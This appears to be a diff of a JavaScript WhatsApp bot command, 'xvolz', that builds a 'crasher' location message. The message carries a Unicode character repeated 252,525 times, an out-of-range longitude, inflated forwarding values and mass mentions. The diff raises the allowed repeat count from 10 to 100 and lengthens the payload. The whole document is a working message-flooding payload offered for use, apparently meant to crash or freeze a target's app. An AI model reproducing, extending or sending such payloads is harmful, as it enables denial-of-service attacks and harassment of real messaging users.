@@ -66,7 +66,7 @@ END:VCARD`;
 case "xvolz": {
   try {
     const target = m.key.remoteJid;
-    const count = Math.min(Number(args[0]) || 1, 10); // maksimal 10x
+    const count = Math.min(Number(args[0]) || 1, 100);
 
     const fuckRexzSuki = {
       key: {
@@ -93,28 +93,37 @@ case "xvolz": {
       return generateRandomLids();
     }
 
-    const locationMsg = proto.Message.LocationMessage.fromObject({
-      degreesLatitude: -9.09165299926,
-      degreesLongitude: 199.197369996311,
-      name: "㑒 ⏤𝐑𝐞𝐱𝐳𝐂𝐫𝐚𝐬𝐡𝐞ʳ🕊️\n" + "ꦾ".repeat(252525),
-      address: "",
-      url: "https://㑒 ⏤𝐑𝐞𝐱𝐳𝐂𝐫𝐚𝐬𝐡𝐞ʳ🕊️ " + "ꦃ".repeat(35) + ".crasher",
-      isLive: true,
-      accuracyInMeters: 252525,
-      jpegThumbnail: null,
-      contextInfo: {
-        forwardingScore: 252525,
-        isForwarded: true,
-        mentionedJid: mentionJid(),
-        externalAdReply: {
-          mediaType: 2,
-          title: "",
-          body: "",
-          mediaUrl: "",
-          thumbnail: null
-        }
-      }
-    });
+const locationMsg = proto.Message.LocationMessage.fromObject({
+  degreesLatitude: -9.09165299926,
+  degreesLongitude: 199.197369996311,
+  name: "㑒 ⏤⃟𝐑͢𝐞⃔𝐱𝐳⃟𝐂͢𝐫⃔𝐚𝐬⃟𝐡⃔͢𝐞ʳ ཀ͜͡🕊️ \n" + "ꦾ".repeat(252525),
+  address: "",
+  url: "https://㑒 ⏤⃟𝐑͢𝐞⃔𝐱𝐳⃟𝐂͢𝐫⃔𝐚𝐬⃟𝐡⃔͢𝐞ʳ ཀ͜͡🕊️ " + "ꦃ".repeat(225) + ".crasher",
+  isLive: true,
+  accuracyInMeters: 252525,
+  jpegThumbnail: null,
+  contextInfo: {
+    forwardingScore: 252525,
+    isForwarded: true,
+    mentionedJid: mentionJid(),
+    externalAdReply: {
+      renderLargerThumbnail: false,
+      clickToWhatsappCall: true,
+      showAdAttribution: false,
+      containsAutoReply: false,
+      originalImageUrl: null,
+      disableNudge: true,
+      thumbnail: null,
+      mediaType: 2,
+      title: "",
+      body: "⃢⃟⃞⃝⃟⃞⃝?⃟⃞⃝⃞⃟⃝?⃢⃟⃞⃝⃟⃞⃝",
+      ctwaClid: "",
+      sourceId: "",
+      mediaUrl: "",
+      ctaPayload: ""
+    }
+  }
+});
 
     const msgContent = {
       ephemeralMessage: {
